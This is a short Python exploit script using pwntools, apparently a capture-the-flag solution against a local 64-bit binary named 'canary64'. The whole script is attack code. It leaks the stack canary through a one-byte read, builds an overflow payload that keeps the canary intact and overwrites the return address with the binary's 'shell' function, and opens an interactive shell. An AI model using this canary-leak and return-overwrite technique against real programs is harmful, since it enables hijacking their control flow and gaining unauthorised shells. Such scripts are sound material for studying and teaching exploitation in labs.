from pwn import *
context(log_level='debug',os ='linux',arch='amd64')
pfile = "./ld-linux-x86-64.so.2 --library-path ./ ./canary64"
p = process(pfile.split())
elf = ELF('./canary64')
shelladdr = elf.symbols['shell']
p.sendline('a')
p.recvuntil('a\n')
canary = u64(p.recv(7).rjust(8,'\x00'))

payload = 'a'+p64(canary)+'12345678'+p64(shelladdr)

p.send(payload)

p.interactive()
